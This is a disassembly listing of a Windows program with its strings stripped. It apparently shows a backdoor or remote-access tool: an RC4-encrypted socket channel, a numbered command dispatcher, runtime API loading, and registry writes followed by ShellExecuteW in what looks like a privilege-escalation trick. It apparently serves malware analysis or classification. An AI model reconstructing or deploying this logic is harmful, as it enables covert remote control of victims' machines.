call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x14
sub_4020b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
xor eax eax
push eax
push eax
push ecx
push sub_4020d7
push eax
push eax
call [ CreateThread@IAT ]
pop ebp
retn 0x4
sub_4020e9
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi ecx
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
and [ esi + 0x30 ] 0x0
push ebx
call [ free@IAT ]
test edi edi
pop ecx
jg r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x34 ]
push eax
push edi
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
sub [ esi + 0x30 ] edi
cmp [ esi + 0x30 ] 0x0
jg r-xdata
push [ esi + 0x34 ]
call [ malloc@IAT ]
pop ecx
mov ebx eax
push 0x0
push [ esi + 0x34 ]
push ebx
push [ esi ]
call recv
mov edi eax
test edi edi
jle r-xdata
mov ecx esi
call sub_4021b3
test al al
je r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x14 ]
mov ecx esi
push [ ebp + 0x8 ]
push eax
call sub_4021b7
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0x1
mov ecx esi
call sub_402664
sub_4021b7
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
mov esi ecx
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor ebx ebx
mov [ esi + 0x30 ] ebx
mov [ ebp - 0x8 ] ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx rw-data
call sub_402b93
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
lea edi [ eax + 0xf ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
cmp edi eax
ja r-xdata
lea eax [ esi + 0x34 ]
lea ecx [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_402389
add esp 0xc
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
sub edi eax
mov [ esi + 0x30 ] edi
push r--data
push rw-data
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
jne r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x18 ]
push [ eax ]
lea eax [ ebp - 0x38 ]
push 0xf
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x48 ]
lea ecx [ ebp - 0x18 ]
push ebx
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x10 ] bl
jne r-xdata
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea eax [ ebp - 0x18 ]
lea ecx [ esi + 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push ebx
push ebx
push ebx
push ebx
call [ CreateEventA@IAT ]
push ebx
push ebx
push esi
mov [ esi + 0x28 ] eax
push [ ebp + 0xc ]
push ebx
push ebx
call [ CreateThread@IAT ]
push 0xffffffff
push [ esi + 0x28 ]
call [ WaitForSingleObject@IAT ]
push [ esi + 0x28 ]
call [ CloseHandle@IAT ]
sub esp 0x10
lea eax [ ebp - 0x18 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push esi
call [ ebp + 0xc ]
add esp 0x14
jmp r-xdata
jmp r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
test eax eax
je r-xdata
push r--data
push rw-data
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
sub_402389
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0xb
push esi
push r--data
call [ strncmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
xor al al
mov ecx [ ebp + 0xc ]
mov eax [ esi + 0xb ]
push edi
mov [ ecx ] eax
mov ecx [ ebp + 0x10 ]
lea edi [ eax + 0xf ]
mov edx [ ecx ]
lea esi [ edx + edx ]
cmp edi esi
pop edi
jbe r-xdata
mov al 0x1
jmp r-xdata
sub eax edx
mov edx 0xfde8
add eax 0xf
cmp eax edx
mov [ ecx ] eax
jbe r-xdata
pop esi
pop ebp
retn
mov [ ecx ] edx
sub_4023d9
push ebp
mov ebp esp
sub esp 0x24
push esi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
push 0x13
push r--data
lea ecx [ ebp - 0x14 ]
add esi 0x4
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0xb
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push 0xf
lea ecx [ ebp - 0x14 ]
mov [ eax ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::empty@IAT ]
test al al
je r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx rw-data
call sub_402b93
push 0x0
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push [ ebp + 0x1c ]
call send
lea ecx [ ebp - 0x24 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
push [ ebp + 0x1c ]
call send
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
pop esi
leave
retn
sub_4024bf
push ebp
mov ebp esp
push esi
push 0x6
push 0x1
push 0x0
call socket
mov esi eax
push 0x10
push rw-data
push esi
call connect
test eax eax
jne r-xdata
push esi
call closesocket
or esi 0xffffffff
push esi
lea eax [ ebp + 0xc ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp + 0x8 ]
call sub_4023d9
add esp 0x18
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
pop esi
pop ebp
retn
sub_402519
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x38 ] bl
jne r-xdata
xor al al
cmp [ rw-data ] bl
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
push ebx
push ebx
push esi
push sub_4026f6
push ebx
push ebx
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x3c ] edi
call [ CreateThread@IAT ]
mov al 0x1
pop edi
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x2 ]
push edi
push eax
movzx eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x30 ]
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0xb ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x18
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
pop ebx
leave
retn 0x4
sub_4025c5
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi ecx
cmp [ esi + 0x38 ] 0x0
je r-xdata
xor al al
cmp [ rw-data ] 0x0
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
and [ esi + 0x40 ] 0x0
mov [ esi + 0x3c ] edi
mov al 0x1
pop edi
jmp r-xdata
cmp [ esi + 0x3c ] edi
je r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x2 ]
push edi
push eax
movzx eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x30 ]
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0xb ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x18
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402664
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi ecx
xor al al
cmp [ esi + 0x38 ] al
je r-xdata
xor al al
cmp [ rw-data ] al
je r-xdata
mov [ esi + 0x39 ] 0x1
mov al 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] al
jne r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x2 ]
push eax
lea ecx [ ebp - 0x30 ]
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0xb ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402705
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x3c ] ebx
mov [ esi + 0x40 ] ebx
jbe r-xdata
cmp [ esi + 0x39 ] bl
jne r-xdata
cmp [ esi + 0x39 ] bl
jne r-xdata
mov [ esi + 0x38 ] bl
mov [ esi + 0x39 ] bl
pop esi
xor eax eax
pop ebx
leave
retn
cmp [ rw-data ] bl
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
inc [ esi + 0x40 ]
mov eax [ esi + 0x40 ]
cmp eax [ esi + 0x3c ]
jb r-xdata
mov ecx esi
call sub_402094
lea eax [ ebp - 0x14 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x6 ]
push eax
lea ecx [ ebp - 0x34 ]
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_402821
push ebp
mov ebp esp
push ebx
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ebx rw-data
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x73
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x74
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn
call eax
mov ecx ebx
call sub_402062
push 0x1
push sub_4028b2
mov ecx ebx
call sub_4020e9
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_4028b2
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
lea eax [ edi + 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ edi + 0x28 ]
call [ SetEvent@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x28 ]
push [ eax ]
lea eax [ ebp - 0x38 ]
push 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x38 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41113a
add esp 0x24
sub esi 0x3a
je r-xdata
xor esi esi
lea ecx [ ebp - 0x18 ]
push esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_405cd4
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
dec esi
jne r-xdata
lea ecx [ ebp - 0x18 ]
call sub_401ad8
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
push r--data
push ebx
call sub_405f2e
push r--data
push ebx
mov [ rw-data ] eax
call sub_405f2e
push r--data
push ebx
mov [ rw-data ] eax
call sub_405f2e
add esp 0x8
mov [ rw-data ] eax
mov ecx esp
mov [ rw-data ] 0x1
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x74
mov ecx edi
call sub_402062
xor esi esi
lea ecx [ ebp - 0x18 ]
push esi
call sub_401289
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ rw-data ]
pop ecx
mov ebx eax
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp ebx esi
je r-xdata
push esi
push esi
push esi
call [ HeapCreate@IAT ]
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
call [ rw-data ]
pop ecx
cmp eax esi
pop ecx
je r-xdata
sub esp 0x10
lea edx [ ebp - 0x1 ]
mov ecx esp
push edx
push eax
push [ ebp - 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3b
mov ecx edi
call sub_402062
push [ ebp - 0x8 ]
push esi
push ebx
call [ HeapFree@IAT ]
jmp r-xdata
sub esp 0x10
lea eax [ ebp + 0xb ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3b
mov ecx edi
call sub_402062
jge r-xdata
lea eax [ ebp - 0x64 ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x64 ]
push eax
call [ DispatchMessageA@IAT ]
jmp r-xdata
jmp r-xdata
push esi
push esi
lea eax [ ebp - 0x64 ]
push esi
push eax
call [ GetMessageA@IAT ]
cmp eax esi
jle r-xdata
sub_402aab
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor ebx ebx
xor eax eax
mov edx ecx
mov edi 0x100
mov [ edx ] eax
inc eax
add edx 0x4
cmp eax edi
jl r-xdata
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov eax [ ebp - 0x4 ]
xor edx edx
div [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
movzx eax [ edx + eax ]
add eax [ esi ]
add eax ebx
mov ebx edi
cdq
idiv ebx
mov al [ esi ]
inc [ ebp - 0x4 ]
movzx eax al
mov ebx edx
mov edx [ ecx + ebx * 4 ]
mov [ esi ] edx
add esi 0x4
cmp [ ebp - 0x4 ] edi
mov [ ecx + ebx * 4 ] eax
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_402b05
push ebp
mov ebp esp
sub esp 0x408
push ebx
push esi
mov esi ecx
mov ebx 0x100
push edi
mov ecx ebx
lea edi [ ebp - 0x408 ]
xor eax eax
inc [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
[ edi ] [ esi ]
mov edi eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
jmp r-xdata
inc eax
mov ecx ebx
cdq
idiv ecx
mov eax [ ebp + edx * 4 - 0x408 ]
mov esi ebx
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
lea ecx [ ebp + edx * 4 - 0x408 ]
cdq
idiv esi
mov al [ ecx ]
mov esi edx
mov edx [ ebp + esi * 4 - 0x408 ]
mov [ ebp - 0x4 ] esi
mov [ ecx ] edx
lea esi [ ebp + esi * 4 - 0x408 ]
movzx edx al
mov eax [ ebp + 0x8 ]
mov [ esi ] edx
lea esi [ edi + eax ]
mov eax [ ecx ]
add eax edx
mov ecx ebx
cdq
idiv ecx
mov al [ ebp + edx * 4 - 0x408 ]
xor [ esi ] al
inc edi
cmp edi [ ebp + 0xc ]
jb r-xdata
mov eax [ ebp - 0x8 ]
sub_402b93
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp + 0xf ]
push esi
push eax
mov esi ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov ecx esi
call sub_402b05
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn 0xc
sub_402be1
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
push ebx
push r--data
push r--data
lea eax [ ebp - 0x18 ]
push 0x80000000
push eax
call sub_40a43e
add esp 0x14
mov esi rw-data
mov ecx esi
push 0x3
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
inc eax
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi 0x80000001
push eax
push edi
call sub_40a788
add esp 0x20
lea eax [ ebp - 0x1 ]
push 0x2
sub esp 0x10
mov ecx esp
push eax
push rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov esi r--data
push esi
push r--data
push edi
call sub_40a690
push r--data
lea eax [ ebp - 0x28 ]
push 0x34
push eax
call sub_407ca7
add esp 0x2c
lea ecx [ ebp - 0x28 ]
push ebx
push esi
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push ebx
call [ ShellExecuteW@IAT ]
cmp eax 0x20
jbe r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push ebx
push ebx
call eax
and [ ebp - 0x8 ] 0x3fff
cmp [ ebp - 0x8 ] 0x3a9f
jae r-xdata
lea ecx [ ebp - 0x28 ]
